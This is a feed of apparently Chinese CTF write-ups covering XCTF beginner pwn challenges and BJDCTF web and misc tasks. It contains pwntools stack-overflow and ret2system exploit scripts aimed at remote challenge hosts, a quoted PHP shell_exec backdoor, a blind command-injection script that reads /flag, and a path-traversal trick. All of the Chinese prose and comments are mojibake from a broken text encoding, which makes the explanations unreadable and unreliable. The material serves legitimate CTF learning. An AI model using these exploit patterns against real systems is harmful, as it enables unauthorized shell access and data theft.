<p>è¿™æ ·å°±å¾—åˆ°äº†åº“ä½ç½®ï¼ˆå¿˜è®°æˆªå›¾äº†ï¼Œæ‡’çš„å†å›è™šæ‹Ÿæœºæˆªäº†ï¼‰<br>
ç„¶åç›´æ¥å†™exp</p>
<pre><code class="language-python">from pwn import *
import ctypes

ip = '124.126.19.106'
port = '49021'
r = remote(ip,port)

elf = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
elf.srand(1) #å¯å†™å¯ä¸å†™ï¼Œå› ä¸ºé»˜è®¤å°±æ˜¯1
offset = 0x20

payload = 'A' * offset + p64(1)
r.recvuntil('Your name:')
r.sendline(payload)
for i in range(0,10):
        number = str(elf.rand()%6 + 1)    #è¿™ä¸ªåœ°æ–¹æ¯”è¾ƒå‘ï¼Œå› ä¸ºr.sendline()çš„å‚æ•°æ˜¯å­—ç¬¦ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æŠŠæ•°å€¼ç±»å‹è½¬æˆå­—ç¬¦ç±»å‹
        r.recvuntil('Please input your guess number:')
        r.sendline(number)
r.interactive()
</code></pre>
<p>ç„¶åå°±æ˜¯flagè¾£<br>
<img src="https://zhangzy999.github.io//post-images/1590980821050.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹åŒºâ€”level2]]></title>
        <id>https://zhangzy999.github.io/post/ad_world_level2/</id>
        <link href="https://zhangzy999.github.io/post/ad_world_level2/">
        </link>
        <updated>2020-05-31T09:19:24.000Z</updated>
        <content type="html"><![CDATA[<p>æˆ‘ä»¬æ‹¿åˆ°ç¨‹åºï¼Œå…ˆè¿è¡Œä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰ç‰¹åˆ«çš„åœ°æ–¹<br>
æŸ¥çœ‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶<br>
<img src="https://zhangzy999.github.io//post-images/1590916932032.png" alt="" loading="lazy"><br>
å‘ç°å¼€å¯äº†NXä¿æŠ¤ï¼Œå°±æ˜¯æ ˆä¸å¯æ‰§è¡Œï¼ˆctfwikiä¸Šå¥½åƒæœ‰è¯¦ç»†è¯´æ˜ï¼‰<br>
æŸ¥çœ‹mainå‡½æ•°<br>
<img src="https://zhangzy999.github.io//post-images/1590916884104.png" alt="" loading="lazy"><br>
å‘ç°æœ‰ä¸€ä¸ªvulè¿™ä¸ªå‡½æ•°ï¼Œè·Ÿè¿›å»çœ‹çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1590916914164.png" alt="" loading="lazy"><br>
é¦–å…ˆæˆ‘ä»¬å¾—åˆ°åç§»ä¸º0x88+0x4ï¼šè¿™ä¸ªç¨‹åºä¸º32ä½ç¨‹åºï¼Œæ‰€ä»¥mainå‡½æ•°ä¸­çš„ebpçš„å€¼åœ¨æ ˆä¸Šæ˜¯32ä½ï¼Œä¹Ÿå°±æ˜¯4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åŠ 0x4æ‰èƒ½åˆ°è¾¾å‡½æ•°çš„è¿”å›åœ°å€<br>
è¿™ä¸ªé¢˜æ˜¯æç¤ºæˆ‘ä»¬æ˜¯ROPï¼Œé‚£è‡ªç„¶æƒ³åˆ°æ‰¾ä¸€ä¸‹systemå‡½æ•°çš„åœ°å€å’Œ&quot;/bin/sh&quot;å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå…ˆæ‰¾ä¸‹systemçš„<br>
<img src="https://zhangzy999.github.io//post-images/1590917154785.png" alt="" loading="lazy"><br>
å¥ˆæ–¯ï¼Œæ¥ç€shift+f12æ‰¾binsh<br>
<img src="https://zhangzy999.github.io//post-images/1590917179756.png" alt="" loading="lazy"><br>
ç„¶åè·Ÿè¿›å»ï¼Œå‘ç°binshå­—ç¬¦ä¸²çš„åœ°å€<br>
<img src="https://zhangzy999.github.io//post-images/1590917197459.png" alt="" loading="lazy"><br>
ç„¶åç›´æ¥å†™expæ‰“ä¸€ä¸‹<br>
ä¸è¿‡æœ‰ä¸ªç‚¹è¦æ³¨æ„ï¼Œsystemå‡½æ•°è°ƒç”¨åä¼šæœ‰ä¸€ä¸ªè¿”å›åœ°å€ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨p32å‡½æ•°å†™ä¸ªé›¶è¿›å»å°±è¡Œï¼ˆæˆ–è€…å†™ç§å››ä¸ªåƒåœ¾å­—ç¬¦'aaaa'ä¹‹ç±»çš„ï¼Œå› ä¸ºæˆ‘ä»¬åªè¦æ‹¿åˆ°shellå°±è¡Œäº†ï¼‰</p>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '30353'
r = remote(ip,port)

offset = 0x88 + 0x4
system_addr = 0x08048320
binsh_addr = 0x0804a024

payload = 'A' * offset + p32(system_addr) + p32(0) + p32(binsh_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>å¥ˆæ–¯ï¼Œç„¶åç›´æ¥cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590917362749.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹åŒºâ€”level0]]></title>
        <id>https://zhangzy999.github.io/post/adworld_level0/</id>
        <link href="https://zhangzy999.github.io/post/adworld_level0/">
        </link>
        <updated>2020-05-28T23:24:59.000Z</updated>
        <content type="html"><![CDATA[<p>ä¸‹è½½é™„ä»¶ï¼Œç®€å•è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°å‡ºç°ä¸€ä¸ªhello worldç„¶åè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åå°±é€€å‡ºç¨‹åºâ€¦â€¦<br>
æˆ‘ä»¬æ‹¿åˆ°idaé‡Œé¢çœ‹ä¸€çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1590708401179.png" alt="" loading="lazy"><br>
å‘ç°æœ‰ä¸€ä¸ªvulè¿™ç§å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1590708423813.png" alt="" loading="lazy"><br>
å‘ç°bufè¿™ä¸ªå˜é‡å‘å †æ ˆç”³è¯·äº†80hè¿™ä¸ªé•¿åº¦ï¼Œä¹Ÿå°±æ˜¯128ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥200ä¸ªå­—èŠ‚ï¼Œè¿™ä¸ªå°±å¾ˆå±é™©äº†ï¼Œå¯ä»¥ç¡®å®šåç§»é‡ä¸º80h+8æ²¡é”™äº†ï¼Œæˆ‘ä»¬å°±æ˜¯è¦å…ˆå¡«å……åƒåœ¾å­—ç¬¦æä¸€ä¸‹80h+8ï¼Œç„¶åå°†å‡½æ•°çš„è¿”å›åœ°å€æ”¹å†™æˆsystemè‡³äºä¸ºå•¥æ˜¯80h+8ï¼Œæ”¾ä¸ªå›¾ï¼Œå°±ä¸è§£é‡Šäº†ï¼ˆæ±‡ç¼–ç”»ç”»å †æ ˆå›¾å°±çŸ¥é“å•¦ï¼‰<br>
<img src="https://zhangzy999.github.io//post-images/1590708690016.png" alt="" loading="lazy"><br>
ç„¶åè¿˜å‘ç°æœ‰systemå‡½æ•°<br>
<img src="https://zhangzy999.github.io//post-images/1590708707600.png" alt="" loading="lazy"><br>
æˆ‘ä»¬ä¸€è·¯è·Ÿè¿›å»ï¼Œæ‰¾æ‰¾å‡½æ•°åœ°å€åœ¨å“ª<br>
<img src="https://zhangzy999.github.io//post-images/1590708724959.png" alt="" loading="lazy"><br>
å®Œç¾ï¼Œæ‹¿åˆ°äº†å‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆæ„é€ expå°±å¾ˆç®€å•äº†ï¼š</p>
<pre><code class="language-python">from pwn import *

r = remote('124.126.19.106','35956')

offset = 0x80 + 8
system_addr = 0x400596

payload = offset * 'A' + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>ç›´æ¥æ‹¿åˆ°shelläº†<br>
<img src="https://zhangzy999.github.io//post-images/1590708766436.png" alt="" loading="lazy"><br>
cat /flag å°±å®Œè¾£</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹åŒºâ€”hello_pwn]]></title>
        <id>https://zhangzy999.github.io/post/adworld_hello_pwn/</id>
        <link href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
        </link>
        <updated>2020-05-28T11:14:02.000Z</updated>
        <content type="html"><![CDATA[<p>æˆ‘ä»¬æ‹¿åˆ°é™„ä»¶åï¼Œç„¶åç®€å•çš„è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°ç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åå°±æ²¡äº†ï¼ˆè‰ç‡.jpg)<br>
<img src="https://zhangzy999.github.io//post-images/1590664509396.png" alt="" loading="lazy"><br>
ç„¶åæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ç¨‹åºå¼€å¯äº†å“ªäº›ä¿æŠ¤</p>
<pre><code>checksec filename
</code></pre>
<p>å‘ç°å¼€å¯äº†NXä¿æŠ¤ï¼ˆä½¿å¾—æ ˆä¸Šçš„æ•°æ®ä¸å¯æ‰§è¡Œï¼‰<br>
<img src="https://zhangzy999.github.io//post-images/1590664569065.png" alt="" loading="lazy"><br>
æˆ‘ä»¬ç”¨ida64ä½æ‰“å¼€ï¼Œç›´æ¥çœ‹mainçš„ä¼ªä»£ç ï¼Œå‘ç°ä¸€ä¸ªreadå‡½æ•°å’Œä¸€ä¸ªifåˆ¤æ–­<br>
<img src="https://zhangzy999.github.io//post-images/1590664604117.png" alt="" loading="lazy"><br>
å¦‚æœæ»¡è¶³ifæ¡ä»¶ï¼Œå°±èƒ½æ‰§è¡Œä¸‹é¢çš„ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°å®ƒå¯ä»¥cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664647984.png" alt="" loading="lazy"><br>
ifæ¡ä»¶è¦æ»¡è¶³ï¼Œå°±èƒ½æ‹¿åˆ°flagï¼Œå…³é”®æ˜¯ifä¸­çš„åˆ¤æ–­å’¯ï¼Œæˆ‘ä»¬è·Ÿè¿›ifçš„é‚£ä¸ªå˜é‡ï¼Œå‘ç°å®ƒè·ç¦»æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„é‚£ä¸ªå˜é‡åªæœ‰å››å­—èŠ‚ï¼Œè€Œåœ¨readä¸­æˆ‘ä»¬å¯ä»¥è¾“å…¥åä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±æ˜¯å˜é‡è¦†ç›–æ²¡è·‘äº†<br>
<img src="https://zhangzy999.github.io//post-images/1590664736849.png" alt="" loading="lazy"><br>
æˆ‘ä»¬ç°åœ¨è®¡ç®—å™¨ä¸­è½¬ä¸‹16è¿›åˆ¶ï¼Œifä¸­çš„é‚£ä¸ªæ•°å­—åˆ°16è¿›åˆ¶å°±æ˜¯0x6E756161æ˜¯å››ä¸ªå­—èŠ‚ï¼Œç¾æ±æ±<br>
å†™ä¸ªexpæ‰“æ‰“å°±å®Œäº‹äº†ï¼ˆæ¯”æ”»é˜²ä¸–ç•Œçš„ç¬¬ä¸€ä¸ªé¢˜è¿˜ç®€å•ï¼‰</p>
<pre><code>from pwn import *

p = remote('124.126.19.106','48949')

offset = 4

payload = offset * 'a' + p64(0x6E756161)

p.recvuntil(&quot;bof&quot;)
p.sendline(payload)
p.interactive()     #å…ˆå…»æˆè‰¯å¥½ä¹ æƒ¯ï¼ŒåŠ ä¸Šè¿™å¥è¯ï¼Œå…å¾—ä»¥åæ‰“shellcodeçš„æ—¶å€™å¿˜äº†åŠ -.-||
</code></pre>
<p>ç„¶åæ‹¿åˆ°flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664968599.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ç¬¬ä¸‰å±ŠBJDCTFèœé¸¡ç­¾åˆ°è®°â€”æŒç»­æ›´æ–°wp]]></title>
        <id>https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/</id>
        <link href="https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/">
        </link>
        <updated>2020-05-27T11:43:26.000Z</updated>
        <content type="html"><![CDATA[<p>æ¯”èµ›æ‰“çš„ç»†ç¢ï¼Œè¿˜å¥½èµ›åå‡ºé¢˜äººè¯´ä¸æ˜¯é’ˆå¯¹æ–°æ‰‹çš„ï¼Œè¦ä¸ç„¶æˆ‘ç›´æ¥è‡ªé—­:-(<br>
ç›´æ¥wpå§ï¼Œå¸Œæœ›ç¬¬å››å±Šæ’åèƒ½å¤Ÿå†²å‡»å‰100</p>
<h1 id="web">web</h1>
<h2 id="å¸®å¸®å°çº¢èŠ±">å¸®å¸®å°çº¢èŠ±</h2>
<p>èµ›åå¤ç°äº†ä¸€æ³¢<br>
è¿™ä¸ªé¢˜ç›®æ˜¯webé‡Œé¢åˆ†æ•°æœ€ä½çš„äº†ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®å¾ˆè‹Ÿ<br>
æ‰“å¼€é¢˜ç›®å°±æ˜¯èŠ±é‡Œèƒ¡å“¨çš„é¡µé¢ï¼Œæ€»ä¹‹é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬phpåç«¯å°±ä¸€å¥è¯</p>
<?php shell_exec($_GET['imagin']); ?>
<p>emm å®ƒåªæœ‰åé—¨ï¼Œæ²¡æœ‰å›æ˜¾çš„åœ°æ–¹ï¼Œå¸¸è§„æ€è·¯ç›´æ¥å¼¹ä¸ªshellç©ç©<br>
æˆ‘Googleäº†ä¸€äº›å‘ç°å¯ä»¥åˆ©ç”¨æœåŠ¡å™¨è§£ææ—¥å¿—dnslogæ¥è¾¾åˆ°ç±»ä¼¼çš„shellæ•ˆæœ<br>
æœ‰ä¸€ä¸ªæä¾›ç±»ä¼¼æœåŠ¡çš„ç½‘ç«™ï¼Œè¿˜å¯ä»¥ä¸€é”®ç”Ÿæˆpayloadï¼ˆè„šæœ¬å°å­ç‹‚å–œï¼‰<br>
æˆ‘ä»¬ç›´æ¥ç”¨dnslogæ‰“å‘ç°è¡Œä¸é€šï¼Œåº”è¯¥æ˜¯åç«¯å¼€å¯äº†é˜²ç«å¢™é™åˆ¶æµé‡ä¹‹ç±»çš„ï¼ˆççŒœçš„ï¼Œä¸è¿‡æœ‰é˜²ç«å¢™æ˜¯è‚¯å®šçš„ï¼‰æˆ–è€…æ˜¯æœåŠ¡å™¨æ²¡æœ‰è¿æ¥ç½‘ç»œ<br>
é‚£ä¹ˆåº”è¯¥æ˜¯bashç›²æ³¨äº†ï¼Œä½†æ˜¯æˆ‘æ¯”èµ›çš„æ—¶å€™æ²¡æœ‰æ³¨å…¥å‡ºæ¥ï¼Œåæ¥å‘ç°è„šæœ¬ä¸­çš„è·¯å¾„å†™é”™äº†è‰-.-||<br>
é¢˜ç›®ä¸­æç¤ºæˆ‘ä»¬flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæˆ‘ç›´æ¥ç®€å•çš„æ”¹äº†æ”¹ä¹‹å‰sqlç›²æ³¨çš„è„šæœ¬ï¼Œä¸€æŠŠæ¢­å‡ºæ¥å°±è¡Œäº†</p>
<pre><code class="language-python">import requests
import time

url = &quot;http://127.0.0.1/flag.php?imagin=&quot;
flag = &quot;BJD{&quot;
flag_list = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789{}&quot;

while True :
    num = 0
    for i in flag_list :
        num = num + 1
        payload = 'grep -e &quot;{}&quot; /flag %26%26 sleep 2'.format(flag + i)
        #%26æ˜¯&amp;çš„urlç¼–ç ï¼Œè¿™ç§ç‰¹æ®Šå­—ç¬¦è¦ç»è¿‡urlç¼–ç ï¼Œè¦ä¸ç„¶æ‰“ä¸å‡ºæ¥-.-|
        start_time = time.time()  #è®¾ç½®å‘é€è¯·æ±‚ä¹‹å‰çš„æ—¶é—´
        r = requests.get(url + payload)
        end_time = time.time()  #è®¾ç½®å‘é€è¯·æ±‚ä¹‹åçš„æ—¶é—´
        if end_time - start_time &gt; 0.5 :
            flag = flag + i
            print(flag)
            break
    if num &gt; 63:
        #æ­¤æ—¶å·²ç»éå†åˆ—è¡¨ï¼Œè¯´æ˜flagå·²ç»åˆ°è¾¾ç»“å°¾
        break
</code></pre>
<p>æ‰“ä¸€ä¸‹ï¼Œå°±èƒ½æ‹¿åˆ°flagäº†<br>
<img src="https://zhangzy999.github.io//post-images/1590580947041.PNG" alt="" loading="lazy"></p>
<h2 id="gob">gob</h2>
<p>è¡¨é¢æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œå…¶å®æ˜¯ç›®å½•ç©¿è¶Š<br>
æœ‰ä¸€ä¸ªæ³¨å†ŒåŠŸèƒ½ä½†æ˜¯æ²¡æœ‰åµç”¨ï¼Œç›´æ¥æ³¨å†Œï¼ˆæˆ–è€…ä¸æ³¨å†Œï¼‰åˆ°æ–‡ä»¶ä¸Šä¼ é¡µé¢<br>
å°è¯•ä¸Šä¼ å„ç§phpï¼Œéƒ½è¢«è§£ææˆäº†æ–‡æœ¬ï¼Œå„ç§å›¾ç‰‡é©¬ .htaccess .user.iniéƒ½æ²¡ç”¨<br>
é›ªæ®‡å¤§ä½¬æç¤ºç›®å½•ç©¿è¶Šåœ¨bpä¸­æ”¹åŒ…<br>
æˆ‘ä»¬æ‰“å¼€bp ç„¶åæŠ“åŒ…æ”¹æ–‡ä»¶å æ”¹æˆ../../../../flag   ç„¶ååé¢çš„base64ç¼–ç çš„ä¸œè¥¿è§£ç è¿‡äº†å°±æ˜¯flagï¼Œæ„Ÿè§‰æ¯”ç¬¬ä¸€é¢˜ç®€å•ï¼Œæœ‰ç‚¹å„¿è„‘æ´çš„æ„Ÿè§‰</p>
<h1 id="misc">misc</h1>
<h2 id="questionnaire">questionnaire</h2>
<p>è°ƒæŸ¥é—®å·ï¼Œåº”è¯¥æ˜¯è€ƒç¤¾å·¥<br>
Google + ç™¾åº¦è¯†å›¾ åŸºæœ¬èƒ½å‡ºæ¥æ‰€æœ‰çš„ç­”æ¡ˆ<br>
è¿˜æœ‰ä¸€ä¸ªé¸­å­çš„ä¸å¥½å‡ºï¼Œå¬å¸ˆå‚…ä»¬è¯´ç”¨ç™¾åº¦åœ°å›¾å¯ä»¥æ‰¾åˆ°ï¼Œè¿˜æŠŠè¡—é“åå­—ç»™åˆ—å‡ºæ¥äº†ï¼ˆtql<br>
å…¶å®è¿™é¢˜ç›´æ¥f12å°±å‡ºäº†è‰<br>
åˆ’æ°´ç­¾åˆ°é¢˜<br>
ç”±äºç¬¬ä¸€æ¬¡ç©è¿™ç§é¢˜  æ„Ÿè§‰è¿˜æŒºæœ‰æ„æ€çš„  ç‰¹åœ°ä¿ç•™äº†ä¸€å¼ å›¾ç‰‡<br>
<img src="https://zhangzy999.github.io//post-images/1590582813536.png" alt="" loading="lazy"></p>
<h2 id="bincat">/bin/cat</h2>
<p>æ‹¿åˆ°gif  é€å¸§æå–  ç„¶ååˆ†ç¦»ä¸‹è‰²é“ èƒ½çœ‹å‡ºæ¥æ˜¯äºŒç»´ç <br>
ä¸ä¼šå†™è„šæœ¬ ç›´æ¥æˆªå›¾å·¥å…·æ‰‹æ’¸  æ‰«æå¾—äºŒç»´ç </p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[è§£å†³çš„ç¬¬ä¸€ä¸ªpwné¢˜ç›®â€”æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºï¼šwhen_did_you_born]]></title>
        <id>https://zhangzy999.github.io/post/pwn_adworld_birth/</id>
        <link href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
        </link>
        <updated>2020-05-27T01:50:48.000Z</updated>
        <content type="html"><![CDATA[<p>å¼€å§‹pwnäº†ï¼Œæˆä¸ºpwnæ‰‹æ˜¯æˆ‘æ¯•ç”Ÿçš„æ¢¦æƒ³ï¼ˆğŸ™<br>
æˆ‘ä»¬ç®€å•è¿è¡Œäº†ä¸€ä¸‹ç¨‹åºï¼Œå‘ç°å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„è¾“å…¥ç”Ÿæ—¥å’Œåå­—çš„åŠŸèƒ½<br>
æˆ‘ä»¬æ‹¿åˆ°idaé‡Œé¢ç®€å•çœ‹ä¸€æ³¢ä¼ªä»£ç <br>
å¯ä»¥çœ‹åˆ°v5æ˜¯ä¸èƒ½è¾“å…¥1926ï¼Œä½†æ˜¯è¦æƒ³æ‹¿åˆ°flagè¿˜å¾—æ˜¯1926ï¼ŒäºŒè€…å†²çªäº†<br>
<img src="https://zhangzy999.github.io//post-images/1590544386227.png" alt="" loading="lazy"><br>
ç„¶åå‘ç°å‰é¢è¿˜æœ‰ä¸€ä¸ªv4ï¼Œå¹¶ä¸”æ˜¯å±é™©å‡½æ•°getsï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡v4è¦†ç›–v5çš„å€¼ï¼Œè®©v5çš„å€¼å˜æˆ1926ä»è€Œç»•è¿‡å‰é¢çš„ifåˆ¤æ–­<br>
<img src="https://zhangzy999.github.io//post-images/1590544537541.png" alt="" loading="lazy"><br>
æ€»ç»“æ€è·¯ï¼šé¦–å…ˆéšä¾¿è¾“å…¥ä¸€ä¸ªv5ï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œç„¶åè¾“å…¥v4ï¼Œé€šè¿‡v4æº¢å‡ºæ¥è¦†ç›–v5ï¼Œä»è€Œè¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œè®©ç¨‹åºæœ¬èº«å»cat flagï¼Œæˆ‘ä»¬ä¹Ÿä¸ç”¨ææ ˆæº¢å‡ºå•¥çš„ï¼Œåªæ˜¯ä¸€ä¸ªå•çº¯çš„â€œå˜é‡æº¢å‡ºâ€<br>
ç›´æ¥å†™ä¸ªexpæ‰“è¿‡å»å°±è¡Œ</p>
<pre><code class="language-python">from pwn import *
p = remote(&quot;124.126.19.106&quot;,&quot;47436&quot;)

offset = 8  #åç§»é‡æ˜¯8

p.recvuntil(&quot;Birth?&quot;) #è¿™ä¸ªæ˜¯åˆ°ç¬¬ä¸€ä¸ªifåˆ¤æ–­åœä¸‹æ¥
p.sendline(&quot;hhh&quot;) #æˆ‘ä»¬éšä¾¿æ‰“ä¸ªä¸œè¥¿è¿›å»å°±è¡Œ

p.recvuntil(&quot;Name?&quot;)
birth = 0x786      #0x786 == 1926
payload = &quot;A&quot;*offset + p64(birth)

p.sendline(payload)
p.interactive()
</code></pre>
<p>ç„¶åå°±æ‹¿åˆ°äº†flag<br>
<img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
]]></content>
    </entry>
</feed>